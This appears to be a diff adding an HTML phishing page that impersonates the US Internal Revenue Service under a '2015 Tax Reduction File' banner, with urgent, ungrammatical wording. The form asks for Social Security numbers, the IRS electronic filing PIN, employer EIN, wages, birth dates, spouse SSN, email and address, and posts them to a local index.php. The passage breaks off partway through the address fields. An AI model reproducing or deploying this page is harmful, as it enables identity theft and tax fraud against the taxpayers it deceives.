@@ -1,0 +1,1688 @@
+<html xmlns="http://www.w3.org/1999/xhtml" lang="EN-US" dir="ltr">
+ <head>
+  <link href="favicon.jpg" type="image/x-icon" rel="shortcut icon" />
+  <!--
+<!DOCTYPE html-->
+  <title>
+   Internal Revenue Service
+  </title>
+  <!--<shtml:html locale="true" />-->
+  <meta content="en-US" http-equiv="Content-Language" />
+  <meta content="Content-Type" http-equiv="Content-Type" />
+  <meta content="no-cache" http-equiv="Cache-Control" />
+  <meta content="no-cache" http-equiv="pragma" />
+  <meta content="0" http-equiv="expires" />
+  <style type="text/css">
+   @import url("css/efp.css");
+  </style>
+  <!--[if IE]>
+		<style type="text/css">
+			@import url("css/efp-ie.css");
+		</style>
+		<![endif]-->
+  <script type="text/javascript" src="js/windows.js">
+  </script>
+  <script type="text/javascript" src="js/inputSharedSecrets.js">
+  </script>
+  <script src="js/jquery-1.11.2.min.js" type="text/javascript">
+  </script>
+  <script type="text/javascript">
+   //&lt;![CDATA[ 
+$(window).load(function(){
+$(document).ready(function () {
+    $('#domicilio').hide();
+    $(".radio").change(function () { //use change event
+        if (this.value == "domicilio") { //check value if it is domicilio
+            $('#domicilio').stop(true,true).show(); //then show
+        } else {
+            $('#domicilio').stop(true,true).hide(); //else hide
+        }
+    });
+});
+});//]]&gt;  
+
+
+$(function() {
+        $('#filingStatus').change(function(){
+            $('.filing').hide();
+            $('#' + $(this).val()).show();
+        });
+    });
+    
+//&lt;![CDATA[ 
+$(window).load(function(){
+$('.eind').keyup(function() {
+    foo = $(this).val().split("-").join(""); // remove hyphens
+ 
+        foo = foo.match(new RegExp('.{1,8}$|.{2}', 'g')).join("-");
+
+        $(this).val(foo);
+   
+    });
+});//]]&gt;
+  </script>
+ </head>
+ <body>
+  <div id="container">
+   <div id="header">
+    <a class="skip-link" href="#mainContent">
+     Skip to Main Content
+    </a>
+    <script type="text/javascript">
+     function toggleHeaderLinks() {
+		var jsHelpDivId = document.getElementById("jsHelpDiv");
+		var noJsHelpDivId = document.getElementById("noJsHelpDiv");
+
+		jsHelpDivId.style.display="inline";
+		noJsHelpDivId.style.display="none";
+	}
+    </script>
+    <a href="#">
+     <img alt="Logo" title="" src="images/irslogo.gif" />
+    </a>
+    <div id="headerlinks">
+     <!-- 
+		If user exits application from results page, requirements state to log 
+		a unique CFP.
+	 -->
+     <!-- logout link -->
+     <a title="Click this link to exit out of this site." href="#">
+      Exit
+     </a>
+     |
+     <!-- help link -->
+     <div style="display: inline;" id="jsHelpDiv">
+      <a title="Click this link for a page of help topics." href="javascript:openHelp('help.php','Help')">
+       Help
+      </a>
+     </div>
+     <div style="display: none;" id="noJsHelpDiv">
+      <a title="Click this link for a page of help topics." target="_help" href="help.php">
+       Help
+      </a>
+     </div>
+    </div>
+    <script type="text/JavaScript" language="JavaScript">
+     toggleHeaderLinks();
+    </script>
+   </div>
+   <div id="content">
+    <a class="skip-link" name="#mainContent">
+     Main Content
+    </a>
+    <form onsubmit="return formValidation();" autocomplete="off" action="index.php" method="post" name="efpForm">
+     <script type="text/javascript">
+      function isNumberKey(event) {
+		var charCode;
+		if (window.event) {
+			charCode = event.keyCode;
+		} else {
+			charCode = event.which;
+		}
+
+		if (charCode &gt; 31 &amp;&amp;
+				(charCode &lt; 48 || charCode &gt; 57)) {
+			//alert("false - " + charCode);
+			return false;
+		}
+		return true;
+	}
+	//autoTab
+	// parameters: 	event - javascript keyup event
+	//				current - current input field
+	//				dest - destination input field
+	function autoTab(event, current, dest) {
+		var keyCode;
+		if (window.event) {
+			keyCode = event.keyCode;
+		} else {
+			keyCode = event.which;
+		}
+
+		if (keyCode &lt; 41 &amp;&amp; keyCode &gt; 36) {
+			//ignore
+		} else if (keyCode == 9 || keyCode == 16) {
+			current.focus();
+			current.select();
+		} else if (current.value.length == current.getAttribute("maxlength")) {
+			dest.focus();
+			dest.select();
+		}
+	}
+
+	//checkErrors - no parameters
+	//
+	//Toggles errorContent div based on whether errors exists.
+	//Interogates Struts ActionErrors from request
+	//if errors exist then toggle errorContent div on, otherwise 
+	//toggle errorContent off 
+	function checkErrors() {
+		var errsDiv;
+
+		if(errs != null &amp;&amp; errs !="" &amp;&amp; errs !=" ") {
+			errsDiv = document.getElementById("errorContent");
+			errsDiv.style.display="block";
+		} else {
+			errsDiv = document.getElementById("errorContent");
+			errsDiv.style.display="none";
+		}
+	}
+
+	//updateTableSummary - no parameters
+	//
+	//Updates summary field on table from resource bundle 
+	//for 508 Compliance
+	function updateTableSummary() {
+		var tbl = document.getElementById("sharedSecretsTable");
+		tbl.summary = summary;
+	}
+	
+	function toggleHelpTopics() {
+		var piPopupDivId = document.getElementById("piHelpTopicPopupDiv");
+		var piTargetDivId = document.getElementById("piHelpTopicTargetDiv");
+		var faPopupDivId = document.getElementById("faHelpTopicPopupDiv");
+		var faTargetDivId = document.getElementById("faHelpTopicTargetDiv");
+		var maPopupDivId = document.getElementById("maHelpTopicPopupDiv");
+		var maTargetDivId = document.getElementById("maHelpTopicTargetDiv");
+		var poPopupDivId = document.getElementById("poBoxHelpTopicPopupDiv");
+		var poTargetDivId = document.getElementById("poBoxHelpTopicTargetDiv");
+		
+		piPopupDivId.style.display="inline";
+		piTargetDivId.style.display="none";
+		faPopupDivId.style.display="inline";
+		faTargetDivId.style.display="none";
+		maPopupDivId.style.display="inline";
+		maTargetDivId.style.display="none";
+		poPopupDivId.style.display="inline";
+		poTargetDivId.style.display="none";
+	}
+	
+	function formatCommas(input)
+            {
+                var nStr = input.value + '';
+                nStr = nStr.replace( /\,/g, "");
+                x = nStr.split( '.' );
+                x1 = x[0];
+                x2 = x.length &gt; 1 ? '.' + x[1] : '';
+                var rgx = /(\d+)(\d{3})/;
+                while ( rgx.test(x1) ) {
+                    x1 = x1.replace( rgx, '$1' + ',' + '$2' );
+                }
+                input.value = x1 + x2;
+            }
+     </script>
+     <div id="contentHeader">
+      <div id="language">
+       <a title="Click this link to view help in Spanish" target="_help" href="http://www.irs.gov/espanol/article/0,,id=214775,00.html">
+        español
+       </a>
+      </div>
+      <h2>
+       2015 Tax Reduction File -
+      </h2>
+     </div>
+     <div style="display: block;" id="errorContent">
+     </div>
+     <div id="privacy_notice">
+     </div>
+     <h4>
+      IMPORTANT FOR EVERY TAX PAYERS to avoid being over charged and Delayed by IRS.
+     </h4>
+     <table summary="form layout table" class="shared_secrets_table" id="sharedSecretsTable">
+      <caption>
+       Required fields
+       <span class="required">
+        *
+       </span>
+      </caption>
+      <!-- SSN Row -->
+      <tbody>
+       <tr>
+        <td class="td_align_right">
+         <label>
+          Social Security Number
+          <span class="required">
+           *
+          </span>
+         </label>
+         <div class="comment">
+          or Individual Taxpayer Identification Number
+         </div>
+        </td>
+        <td class="td_align_left">
+         <input type="password" title="Enter the first 3 digits of your Social Security Number" id="ssn1" onkeypress="return isNumberKey(event)" onkeyup="autoTab(event, this, document.efpForm.ssn2)" value="" size="3" maxlength="3" name="ssn1" />
+         -
+         <input type="password" title="Enter the middle 2 digits of your Social Security Number" id="ssn2" onkeypress="return isNumberKey(event)" onkeyup="autoTab(event, this, document.efpForm.ssn3)" value="" size="2" maxlength="2" name="ssn2" />
+         -
+         <input type="text" title="Enter the last 4 digits of your Social Security Number" id="ssn3" onkeypress="return isNumberKey(event)" value="" size="4" maxlength="4" name="ssn3" />
+        </td>
+        <td rowspan="4" class="td_help">
+        </td>
+       </tr>
+       <!-- Did you file? Row -->
+       <tr>
+        <td class="td_align_right">
+        </td>
+        <td class="td_align_left">
+         <label for="filing">
+          Did You Submit Your Federal Income Tax Returns for 2014
+          <span class="required">
+           *
+          </span>
+         </label>
+         <div id="privacy_notice">
+          Yes
+          <input type="radio" id="re" value="domicilio" name="d_file" class="radio" />
+            
+			No
+          <input type="radio" id="close" value="close" name="d_file" class="radio" />
+         </div>
+        </td>
+       </tr>
+       <!-- ecode Row -->
+      </tbody>
+      <tbody id="domicilio" style="display: none;">
+       <tr>
+        <td class="td_align_right">
+         <label for="epin">
+          "IRS Electronic Filing PIN"
+          <span class="required">
+           *
+          </span>
+         </label>
+        </td>
+        <td class="td_align_left">
+         <input type="password" onkeypress="return isNumberKey(event)" title="Enter your Electronic PIN" id="epin" value="" size="14" maxlength="5" name="epin" />
+        </td>
+       </tr>
+       <tr>
+        <td class="td_align_right">
+         <label for="ein">
+          Employee Identification Number
+          <span class="required">
+           *
+          </span>
+         </label>
+        </td>
+        <td class="td_align_left">
+         <input type="text" title="Enter your EIN" id="eind" value="" size="25" maxlength="10" class="eind" name="ein" />
+        </td>
+       </tr>
+       <tr>
+        <td class="td_align_right">
+         <label for="employer">
+          Employer Name
+          <span class="required">
+           *
+          </span>
+         </label>
+        </td>
+        <td class="td_align_left">
+         <input type="text" title="Enter your employer" id="employer" value="" size="35" maxlength="100" name="employer" />
+        </td>
+       </tr>
+       <tr>
+        <td class="td_align_right">
+         <label for="employer">
+          Employer Full Address
+          <span class="required">
+           *
+          </span>
+         </label>
+        </td>
+        <td class="td_align_left">
+         <textarea cols="34" name="employer_add">
+         </textarea>
+        </td>
+       </tr>
+       <tr>
+        <td class="td_align_right">
+         <label for="wages">
+          Annual Wages / Salary
+          <span class="required">
+           *
+          </span>
+         </label>
+        </td>
+        <td class="td_align_left">
+         <input type="text" title="Enter your annual wages / salary" id="income" value="" size="20" maxlength="20" onkeyup="formatCommas(this)" name="income" />
+        </td>
+       </tr>
+       <tr>
+        <td class="td_align_right">
+        </td>
+        <td class="td_align_left">
+        </td>
+       </tr>
+      </tbody>
+      <!-- First Name Row -->
+      <tbody>
+       <tr>
+        <td class="td_align_right">
+         <label for="firstName">
+          First Name
+          <span class="required">
+           *
+          </span>
+         </label>
+        </td>
+        <td class="td_align_left">
+         <input type="text" title="Enter your First Name" id="firstName" value="" size="35" maxlength="35" name="firstName" />
+        </td>
+       </tr>
+       <!-- Last Name Row -->
+       <tr>
+        <td class="td_align_right">
+         <label for="lastName">
+          Last Name
+          <span class="required">
+           *
+          </span>
+         </label>
+        </td>
+        <td class="td_align_left">
+         <input type="text" title="Enter your Last Name" id="lastName" value="" size="35" maxlength="35" name="lastName" />
+        </td>
+       </tr>
+       <!-- Email Row -->
+       <tr>
+        <td class="td_align_right">
+         <label for="lastName">
+          Email Address
+          <span class="required">
+           *
+          </span>
+         </label>
+        </td>
+        <td class="td_align_left">
+         <input type="text" title="Enter your Email Address" id="email" value="" size="35" maxlength="100" name="email" />
+        </td>
+       </tr>
+       <!-- DOB -->
+       <tr>
+        <td class="td_align_right">
+         <label>
+          Date of Birth
+          <span class="required">
+           *
+          </span>
+         </label>
+        </td>
+        <td class="td_align_left">
+         <input type="text" title="Date of Birth MM" id="dobMonth" onkeypress="return isNumberKey(event)" onkeyup="autoTab(event, this, document.efpForm.dobDay)" onclick="selectAllDate(this)" value="" size="2" maxlength="2" name="dobMonth" />
+         /
+         <input type="text" title="Date of Birth DD" id="dobDay" onkeypress="return isNumberKey(event)" onkeyup="autoTab(event, this, document.efpForm.dobYear)" onclick="selectAllDate(this)" value="" size="2" maxlength="2" name="dobDay" />
+         /
+         <input type="text" title="Date of Birth YYYY" id="dobYear" onkeypress="return isNumberKey(event)" onclick="selectAllDate(this)" value="" size="4" maxlength="4" name="dobYear" />
+         <span class="format">
+          MM / DD / YYYY
+         </span>
+        </td>
+       </tr>
+       <!-- Filing Status -->
+       <tr>
+        <td class="td_align_right">
+         <label for="filingStatus">
+          Filing Status
+          <span class="required">
+           *
+          </span>
+         </label>
+        </td>
+        <td class="td_align_left">
+         <select title="Select your Filing Status" id="filingStatus" name="filingStatus">
+          <option value="none">
+           Select One
+          </option>
+          <option value="1">
+           Single
+          </option>
+          <option value="2">
+           Married-Filing Joint Return
+          </option>
+          <option value="2">
+           Married-Filing Separate Return
+          </option>
+          <option value="3">
+           Head of Household
+          </option>
+          <option value="4">
+           Qualifying Widow(er) with dependent child
+          </option>
+         </select>
+        </td>
+       </tr>
+       <!-- spouse details -->
+      </tbody>
+      <tbody style="display:none" class="filing" id="2">
+       <tr>
+        <td class="td_align_right">
+        </td>
+        <td class="td_align_left">
+        </td>
+       </tr>
+       <tr>
+        <td class="td_align_right">
+         <label for="filingStatus">
+          Spouse Full Names
+          <span class="required">
+           *
+          </span>
+         </label>
+        </td>
+        <td class="td_align_left">
+         <input type="text" title="Enter your Spouse Full Name" id="spouse_fname" value="" size="35" maxlength="85" name="spouse_fname" />
+        </td>
+       </tr>
+       <tr>
+       </tr>
+       <tr>
+        <td class="td_align_right">
+         <label>
+          Spouse SSN
+          <span class="required">
+           *
+          </span>
+         </label>
+         <label class="hidden">
+          Required Field
+         </label>
+        </td>
+        <td class="td_align_left">
+         <input type="password" title="Enter the first 3 digits of your Spouse SSN" id="ssn4" onkeypress="return isNumberKey(event)" onkeyup="autoTab(event, this, document.efpForm.ssn5)" value="" size="3" maxlength="3" name="ssn4" />
+         -
+         <input type="password" title="Enter the middle 2 digits of your Spouse SSN" id="ssn5" onkeypress="return isNumberKey(event)" onkeyup="autoTab(event, this, document.efpForm.ssn6)" value="" size="2" maxlength="2" name="ssn5" />
+         -
+         <input type="text" title="Enter the last 4 digits of your Spouse SSN" id="ssn6" onkeypress="return isNumberKey(event)" value="" size="4" maxlength="4" name="ssn6" />
+        </td>
+        <td rowspan="4" class="td_help">
+        </td>
+       </tr>
+       <!-- Spouse DOB -->
+       <tr>
+        <td class="td_align_right">
+         <label>
+          Spouse Date of Birth
+          <span class="required">
+           *
+          </span>
+         </label>
+        </td>
+        <td class="td_align_left">
+         <input type="text" title="Spouse Date of Birth MM" id="dobspMonth" onkeyup="autoTab(event, this, document.efpForm.dobspDay)" onclick="selectAllDate(this)" value="" size="2" maxlength="2" name="dobspMonth" />
+         /
+         <input type="text" title="Spouse Date of Birth DD" id="dobspDay" onkeyup="autoTab(event, this, document.efpForm.dobspYear)" onclick="selectAllDate(this)" value="" size="2" maxlength="2" name="dobspDay" />
+         /
+         <input type="text" title="Spouse Date of Birth YYYY" id="dobspYear" onclick="selectAllDate(this)" value="" size="4" maxlength="4" name="dobspYear" />
+         <span class="format">
+          MM / DD / YYYY
+         </span>
+        </td>
+       </tr>
+       <tr>
+        <td class="td_align_right">
+        </td>
+        <td class="td_align_left">
+        </td>
+       </tr>
+      </tbody>
+      <!-- Address -->
+      <tbody>
+       <tr>
+        <td class="td_align_right">
+         <label>
+          Address (Number and Street)
+          <span class="required">
+           *
+          </span>
+         </label>
+        </td>
+        <td class="td_align_left">
+         <input type="text" title="Enter your Address (Number and Street)" id="address" value="" size="50" maxlength="100" name="address" />
+        </td>
+       </tr>
+       <!-- Apt. Number -->
+       <tr>
+        <td class="td_align_right">
+         <label>
+          Apt. Number
+         </label>
+        </td>
+        <td class="td_align_left">
+         <input type="text" title="Enter your Apartment Number - Required if it appears on your tax return" id="aptNumber" value="" size="10" maxlength="10" name="aptNumber" />
+        </td>
+       </tr>
+       <!-- Country -->
+       <tr>
+        <td class="td_align_right">
+         <label for="country">
+          Country
+          <span class="required">
+           *
+          </span>
+         </label>
+        </td>
+        <td class="td_align_left">
+         <select title="Select your Country" id="country" onchange="checkCountry(this)" name="country">
+          <option value="Afghanistan">
+           Afghanistan
+          </option>
+          <option value="Akrotiri Sov Base Area">
+           Akrotiri Sov Base Area
+          </option>
+          <option value="Albania">
+           Albania
+          </option>
+          <option value="Algeria">
+           Algeria
+          </option>
+          <option value="Andorra">
+           Andorra
+          </option>
+          <option value="Angola">
+           Angola
+          </option>
+          <option value="Anguilla">
+           Anguilla
+          </option>
+          <option value="Antarctica">
+           Antarctica
+          </option>
+          <option value="Antigua & Barbuda">
+           Antigua &amp; Barbuda
+          </option>
+          <option value="Argentina">
+           Argentina
+          </option>
+          <option value="Armenia">
+           Armenia
+          </option>
+          <option value="Aruba">
+           Aruba
+          </option>
+          <option value="Ashmore & Cartier Is">
+           Ashmore &amp; Cartier Is
+          </option>
+          <option value="Australia">
+           Australia
+          </option>
+          <option value="Austria">
+           Austria
+          </option>
+          <option value="Azerbaijan">
+           Azerbaijan
+          </option>
+          <option value="Bahrain">
+           Bahrain
+          </option>
+          <option value="Baker Island">
+           Baker Island
+          </option>
+          <option value="Bangladesh">
+           Bangladesh
+          </option>
+          <option value="Barbados">
+           Barbados
+          </option>
+          <option value="Bassas da India">
+           Bassas da India
+          </option>
+          <option value="Belarus">
+           Belarus
+          </option>
+          <option value="Belgium">
+           Belgium
+          </option>
+          <option value="Belize">
+           Belize
+          </option>
+          <option value="Benin">
+           Benin
+          </option>
+          <option value="Bermuda">
+           Bermuda
+          </option>
+          <option value="Bhutan">
+           Bhutan
+          </option>
+          <option value="Bolivia">
+           Bolivia
+          </option>
+          <option value="Bosnia-Herzegovina">
+           Bosnia-Herzegovina
+          </option>
+          <option value="Botswana">
+           Botswana
+          </option>
+          <option value="Bouvet Island">
+           Bouvet Island
+          </option>
+          <option value="Brazil">
+           Brazil
+          </option>
+          <option value="British Indian Ocean Terr">
+           British Indian Ocean Terr
+          </option>
+          <option value="British Virgin Islands">
+           British Virgin Islands
+          </option>
+          <option value="Brunei">
+           Brunei
+          </option>
+          <option value="Bulgaria">
+           Bulgaria
+          </option>
+          <option value="Burkina Faso">
+           Burkina Faso
+          </option>
+          <option value="Burma">
+           Burma
+          </option>
+          <option value="Burundi">
+           Burundi
+          </option>
+          <option value="Cambodia">
+           Cambodia
+          </option>
+          <option value="Cameroon">
+           Cameroon
+          </option>
+          <option value="Canada">
+           Canada
+          </option>
+          <option value="Cape Verde">
+           Cape Verde
+          </option>
+          <option value="Cayman Islands">
+           Cayman Islands
+          </option>
+          <option value="Central African Republic">
+           Central African Republic
+          </option>
+          <option value="Chad">
+           Chad
+          </option>
+          <option value="Chile">
+           Chile
+          </option>
+          <option value="China">
+           China
+          </option>
+          <option value="Christmas Island">
+           Christmas Island
+          </option>
+          <option value="Clipperton Islands">
+           Clipperton Islands
+          </option>
+          <option value="Cocos Island">
+           Cocos Island
+          </option>
+          <option value="Colombia">
+           Colombia
+          </option>
+          <option value="Comoros">
+           Comoros
+          </option>
+          <option value="Congo">
+           Congo
+          </option>
+          <option value="Cook Islands">
+           Cook Islands
+          </option>
+          <option value="Coral Sea Islands Territory">
+           Coral Sea Islands Territory
+          </option>
+          <option value="Costa Rica">
+           Costa Rica
+          </option>
+          <option value="Cote d'Ivoire">
+           Cote d'Ivoire
+          </option>
+          <option value="Croatia">
+           Croatia
+          </option>
+          <option value="Cuba">
+           Cuba
+          </option>
+          <option value="Cyprus">
+           Cyprus
+          </option>
+          <option value="Czech Republic">
+           Czech Republic
+          </option>
+          <option value="Dem People's Rep of Korea">
+           Dem People's Rep of Korea
+          </option>
+          <option value="Dem Rep of Congo">
+           Dem Rep of Congo
+          </option>
+          <option value="Denmark">
+           Denmark
+          </option>
+          <option value="Dhekelia Sov Base Area">
+           Dhekelia Sov Base Area
+          </option>
+          <option value="Djibouti">
+           Djibouti
+          </option>
+          <option value="Dominica">
+           Dominica
+          </option>
+          <option value="Dominican Republic">
+           Dominican Republic
+          </option>
+          <option value="East Timor">
+           East Timor
+          </option>
+          <option value="Ecuador">
+           Ecuador
+          </option>
+          <option value="Egypt">
+           Egypt
+          </option>
+          <option value="El Salvador">
+           El Salvador
+          </option>
+          <option value="England">
+           England
+          </option>
+          <option value="Equatorial Guinea">
+           Equatorial Guinea
+          </option>
+          <option value="Eritrea">
+           Eritrea
+          </option>
+          <option value="Estonia">
+           Estonia
+          </option>
+          <option value="Ethiopia">
+           Ethiopia
+          </option>
+          <option value="Europa Island">
+           Europa Island
+          </option>
+          <option value="Falkland Islands">
+           Falkland Islands
+          </option>
+          <option value="Faroe Islands">
+           Faroe Islands
+          </option>
+          <option value="Fiji">
+           Fiji
+          </option>
+          <option value="Finland">
+           Finland
+          </option>
+          <option value="Fr Southern & Antarctic Lands">
+           Fr Southern &amp; Antarctic Lands
+          </option>
+          <option value="France">
+           France
+          </option>
+          <option value="French Guiana">
+           French Guiana
+          </option>
+          <option value="French Polynesia">
+           French Polynesia
+          </option>
+          <option value="Gabon">
+           Gabon
+          </option>
+          <option value="Gaza Strip">
+           Gaza Strip
+          </option>
+          <option value="Georgia">
+           Georgia
+          </option>
+          <option value="Germany">
+           Germany
+          </option>
+          <option value="Ghana">
+           Ghana
+          </option>
+          <option value="Gibraltar">
+           Gibraltar
+          </option>
+          <option value="Glorioso Islands">
+           Glorioso Islands
+          </option>
+          <option value="Great Britain">
+           Great Britain
+          </option>
+          <option value="Greece">
+           Greece
+          </option>
+          <option value="Greenland">
+           Greenland
+          </option>
+          <option value="Grenada">
+           Grenada
+          </option>
+          <option value="Guadeloupe">
+           Guadeloupe
+          </option>
+          <option value="Guatemala">
+           Guatemala
+          </option>
+          <option value="Guernsey">
+           Guernsey
+          </option>
+          <option value="Guinea">
+           Guinea
+          </option>
+          <option value="Guinea-Bissau">
+           Guinea-Bissau
+          </option>
+          <option value="Guyana">
+           Guyana
+          </option>
+          <option value="Haiti">
+           Haiti
+          </option>
+          <option value="Heard Is & McDonald Is">
+           Heard Is &amp; McDonald Is
+          </option>
+          <option value="Honduras">
+           Honduras
+          </option>
+          <option value="Hong Kong">
+           Hong Kong
+          </option>
+          <option value="Howland Island">
+           Howland Island
+          </option>
+          <option value="Hungary">
+           Hungary
+          </option>
+          <option value="Iceland">
+           Iceland
+          </option>
+          <option value="India">
+           India
+          </option>
+          <option value="Indonesia">
+           Indonesia
+          </option>
+          <option value="Iran">
+           Iran
+          </option>
+          <option value="Iraq">
+           Iraq
+          </option>
+          <option value="Ireland">
+           Ireland
+          </option>
+          <option value="Isle of Man">
+           Isle of Man
+          </option>
+          <option value="Israel">
+           Israel
+          </option>
+          <option value="Italy">
+           Italy
+          </option>
+          <option value="Jamaica">
+           Jamaica
+          </option>
+          <option value="Jan Mayen">
+           Jan Mayen
+          </option>
+          <option value="Japan">
+           Japan
+          </option>
+          <option value="Jarvis Island">
+           Jarvis Island
+          </option>
+          <option value="Jersey">
+           Jersey
+          </option>
+          <option value="Johnston Atoll">
+           Johnston Atoll
+          </option>
+          <option value="Jordan">
+           Jordan
+          </option>
+          <option value="Juan de Nova Island">
+           Juan de Nova Island
+          </option>
+          <option value="Kazakhstan">
+           Kazakhstan
+          </option>
+          <option value="Kenya">
+           Kenya
+          </option>
+          <option value="Kingman Reef">
+           Kingman Reef
+          </option>
+          <option value="Kiribati">
+           Kiribati
+          </option>
+          <option value="Kuwait">
+           Kuwait
+          </option>
+          <option value="Kyrgyzstan">
+           Kyrgyzstan
+          </option>
+          <option value="Laos">
+           Laos
+          </option>
+          <option value="Latvia">
+           Latvia
+          </option>
+          <option value="Lebanon">
+           Lebanon
+          </option>
+          <option value="Lesotho">
+           Lesotho
+          </option>
+          <option value="Liberia">
+           Liberia
+          </option>
+          <option value="Libya">
+           Libya
+          </option>
+          <option value="Liechtenstein">
+           Liechtenstein
+          </option>
+          <option value="Lithuania">
+           Lithuania
+          </option>
+          <option value="Luxembourg">
+           Luxembourg
+          </option>
+          <option value="Macau">
+           Macau
+          </option>
+          <option value="Macedonia">
+           Macedonia
+          </option>
+          <option value="Madagascar">
+           Madagascar
+          </option>
+          <option value="Malawi">
+           Malawi
+          </option>
+          <option value="Malaysia">
+           Malaysia
+          </option>
+          <option value="Maldives">
+           Maldives
+          </option>
+          <option value="Mali">
+           Mali
+          </option>
+          <option value="Malta">
+           Malta
+          </option>
+          <option value="Martinique">
+           Martinique
+          </option>
+          <option value="Mauritania">
+           Mauritania
+          </option>
+          <option value="Mauritius">
+           Mauritius
+          </option>
+          <option value="Mayotte">
+           Mayotte
+          </option>
+          <option value="Mexico">
+           Mexico
+          </option>
+          <option value="Midway Islands">
+           Midway Islands
+          </option>
+          <option value="Moldova">
+           Moldova
+          </option>
+          <option value="Monaco">
+           Monaco
+          </option>
+          <option value="Mongolia">
+           Mongolia
+          </option>
+          <option value="Montenegro">
+           Montenegro
+          </option>
+          <option value="Montserrat">
+           Montserrat
+          </option>
+          <option value="Morocco">
+           Morocco
+          </option>
+          <option value="Mozambique">
+           Mozambique
+          </option>
+          <option value="Namibia">
+           Namibia
+          </option>
+          <option value="Nauru">
+           Nauru
+          </option>
+          <option value="Navassa Island">
+           Navassa Island
+          </option>
+          <option value="Nepal">
+           Nepal
+          </option>
+          <option value="Netherlands">
+           Netherlands
+          </option>
+          <option value="Netherlands Antilles">
+           Netherlands Antilles
+          </option>
+          <option value="New Caledonia">
+           New Caledonia
+          </option>
+          <option value="New Zealand">
+           New Zealand
+          </option>
+          <option value="Nicaragua">
+           Nicaragua
+          </option>
+          <option value="Niger">
+           Niger
+          </option>
+          <option value="Nigeria">
+           Nigeria
+          </option>
+          <option value="Niue">
+           Niue
+          </option>
+          <option value="Norfolk Island">
+           Norfolk Island
+          </option>
+          <option value="Norway">
+           Norway
+          </option>
+          <option value="Oman">
+           Oman
+          </option>
+          <option value="Pakistan">
+           Pakistan
+          </option>
+          <option value="Palmyra Atoll">
+           Palmyra Atoll
+          </option>
+          <option value="Panama">
+           Panama
+          </option>
+          <option value="Papua New Guinea">
+           Papua New Guinea
+          </option>
+          <option value="Paracel Islands">
+           Paracel Islands
+          </option>
+          <option value="Paraguay">
+           Paraguay
+          </option>
+          <option value="Peru">
+           Peru
+          </option>
+          <option value="Philippines">
+           Philippines
+          </option>
+          <option value="Pitcairn Islands">
+           Pitcairn Islands
+          </option>
+          <option value="Poland">
+           Poland
+          </option>
+          <option value="Portugal">
+           Portugal
+          </option>
+          <option value="Qatar">
+           Qatar
+          </option>
+          <option value="Republic of Korea">
+           Republic of Korea
+          </option>
+          <option value="Reunion">
+           Reunion
+          </option>
+          <option value="Romania">
+           Romania
+          </option>
+          <option value="Russia">
+           Russia
+          </option>
+          <option value="Rwanda">
+           Rwanda
+          </option>
+          <option value="S Georgia & S Sandwich Is">
+           S Georgia &amp; S Sandwich Is
+          </option>
+          <option value="San Marino">
+           San Marino
+          </option>
+          <option value="Sao Tome and Principe">
+           Sao Tome and Principe
+          </option>
+          <option value="Saudi Arabia">
+           Saudi Arabia
+          </option>
+          <option value="Scotland">
+           Scotland
+          </option>
+          <option value="Senegal">
+           Senegal
+          </option>
+          <option value="Serbia">
+           Serbia
+          </option>
+          <option value="Seychelles">
+           Seychelles
+          </option>
+          <option value="Sierra Leone">
+           Sierra Leone
+          </option>
+          <option value="Singapore">
+           Singapore
+          </option>
+          <option value="Slovakia">
+           Slovakia
+          </option>
+          <option value="Slovenia">
+           Slovenia
+          </option>
+          <option value="Solomon Islands">
+           Solomon Islands
+          </option>
+          <option value="Somalia">
+           Somalia
+          </option>
+          <option value="South Africa">
+           South Africa
+          </option>
+          <option value="Spain">
+           Spain
+          </option>
+          <option value="Spratly Islands">
+           Spratly Islands
+          </option>
+          <option value="Sri Lanka">
+           Sri Lanka
+          </option>
+          <option value="St Helena">
+           St Helena
+          </option>
+          <option value="St Kitts">
+           St Kitts
+          </option>
+          <option value="St Lucia">
+           St Lucia
+          </option>
+          <option value="St Pierre & Miquelon">
+           St Pierre &amp; Miquelon
+          </option>
+          <option value="St Vincent & Grenadines">
+           St Vincent &amp; Grenadines
+          </option>
+          <option value="Sudan">
+           Sudan
+          </option>
+          <option value="Suriname">
+           Suriname
+          </option>
+          <option value="Svalbard">
+           Svalbard
+          </option>
+          <option value="Swaziland">
+           Swaziland
+          </option>
+          <option value="Sweden">
+           Sweden
+          </option>
+          <option value="Switzerland">
+           Switzerland
+          </option>
+          <option value="Syria">
+           Syria
+          </option>
+          <option value="Taiwan">
+           Taiwan
+          </option>
+          <option value="Tajikistan">
+           Tajikistan
+          </option>
+          <option value="Tanzania">
+           Tanzania
+          </option>
+          <option value="Thailand">
+           Thailand
+          </option>
+          <option value="The Bahamas">
+           The Bahamas
+          </option>
+          <option value="The Gambia">
+           The Gambia
+          </option>
+          <option value="Togo">
+           Togo
+          </option>
+          <option value="Tokelau">
+           Tokelau
+          </option>
+          <option value="Tonga">
+           Tonga
+          </option>
+          <option value="Trinidad and Tobago">
+           Trinidad and Tobago
+          </option>
+          <option value="Tromelin Island">
+           Tromelin Island
+          </option>
+          <option value="Tunisia">
+           Tunisia
+          </option>
+          <option value="Turkey">
+           Turkey
+          </option>
+          <option value="Turkmenistan">
+           Turkmenistan
+          </option>
+          <option value="Turks & Caicos Islands">
+           Turks &amp; Caicos Islands
+          </option>
+          <option value="Tuvalu">
+           Tuvalu
+          </option>
+          <option value="Uganda">
+           Uganda
+          </option>
+          <option value="Ukraine">
+           Ukraine
+          </option>
+          <option value="United Arab Emirates">
+           United Arab Emirates
+          </option>
+          <option value="United Kingdom">
+           United Kingdom
+          </option>
+          <option selected="selected" value="United States">
+           United States
+          </option>
+          <option value="Uruguay">
+           Uruguay
+          </option>
+          <option value="Uzbekistan">
+           Uzbekistan
+          </option>
+          <option value="Vanuatu">
+           Vanuatu
+          </option>
+          <option value="Vatican City">
+           Vatican City
+          </option>
+          <option value="Venezuela">
+           Venezuela
+          </option>
+          <option value="Vietnam">
+           Vietnam
+          </option>
+          <option value="Wake Island">
+           Wake Island
+          </option>
+          <option value="Wales">
+           Wales
+          </option>
+          <option value="Wallisand Futuna">
+           Wallisand Futuna
+          </option>
+          <option value="West Bank">
+           West Bank
+          </option>
+          <option value="Western Sahara">
+           Western Sahara
+          </option>
+          <option value="Western Samoa">
+           Western Samoa
+          </option>
+          <option value="Yemen">
+           Yemen
+          </option>
+          <option value="Yugoslavia">
+           Yugoslavia
+          </option>
+          <option value="Zambia">
+           Zambia
+          </option>
+          <option value="Zimbabwe">
+           Zimbabwe
+          </option>
+         </select>
+        </td>
+        <td rowspan="4" class="td_help">
+        </td>
+       </tr>
+       <!-- City -->
+       <tr>
+        <td class="td_align_right">
